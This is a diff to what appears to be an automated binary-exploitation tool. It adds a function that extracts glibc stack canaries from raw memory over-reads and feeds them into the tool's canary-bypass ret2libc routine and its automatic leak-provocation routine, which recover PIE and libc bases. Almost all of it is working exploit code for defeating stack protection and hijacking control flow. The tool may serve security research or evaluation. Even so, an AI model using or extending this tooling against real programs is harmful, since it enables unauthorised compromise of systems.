@@ -879,6 +879,7 @@ def canary_ret2libc(exe, workdir, *, offset, canary_offset, ret_offset, canary_t
         dump = _read_until(p, time.time() + timeout / 2)
         vals = [int(m.group(0), 16) for m in rx.finditer(dump)
                 if _allint(m.group(0))]
+        vals += _le_canary_words(dump)               # a raw over-read leaks the canary as binary
         if canary_index is not None and -len(vals) <= canary_index < len(vals):
             return vals[canary_index]
         return rop.find_canary(vals)
@@ -979,6 +980,28 @@ def _le_pointer_words(data: bytes, cap: int = 256) -> list:
 
 
 # --- automatic leak classification + provocation (gap #2) ---------------------------------------
+def _le_canary_words(data: bytes, cap: int = 64) -> list:
+    """8-byte words in `data` shaped like a glibc stack canary -- low byte 0x00, the rest non-zero,
+    and NOT a canonical pointer. A raw stack over-read leaks the canary as exactly such a word, which
+    _le_pointer_words (pointer-shaped only) drops, so find_canary never saw it. Scanned at every byte
+    offset (a text prefix shifts 8-byte alignment); a wrong candidate only makes the canary-writeback
+    trip __stack_chk_fail, which fails the exploit safely rather than confirming a false L3."""
+    out = []
+    for i in range(0, max(0, len(data) - 7)):
+        wb = data[i:i + 8]
+        if wb[0] != 0 or wb[1] == 0:                      # NUL terminator low, byte 1 random-nonzero
+            continue
+        if sum(1 for b in wb if b) < 5:                   # a real canary is high-entropy (7 nonzero
+            continue                                      # bytes); a shifted window has few -> reject
+        w = int.from_bytes(wb, "little")
+        if (0x550000000000 <= w <= 0x5FFFFFFFFFFF) or (0x7F0000000000 <= w <= 0x7FFFFFFFFFFF):
+            continue                                      # a pointer that happens to end in 0x00
+        out.append(w)
+        if len(out) >= cap:
+            break
+    return out
+
+
 def classify_leak(vals, target_bytes: bytes, libc_data: bytes = b"") -> dict:
     """Auto-classify a leaked-pointer burst: recover the PIE base (from the binary's own symbols),
     the libc base (from libc's symbols, when a libc is given) and the stack canary, using ONLY the
@@ -1068,6 +1091,7 @@ def auto_provoke_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=()
         # userspace pointer is 0x0000_7fxx_xxxx_xxxx (libc/mmap/stack) or 0x0000_55/56xx (PIE image).
         vals = [int(m.group(0), 16) for m in hexrx.finditer(dump) if _allint(m.group(0))]
         vals += _le_pointer_words(dump)
+        vals += _le_canary_words(dump)                   # canary isn't pointer-shaped -> harvest it
         cls = classify_leak(vals, target_bytes, libc_data)
         # keep the richest result (most fields recovered)
         score = sum(cls[k] is not None for k in ("pie_base", "libc_base", "canary"))
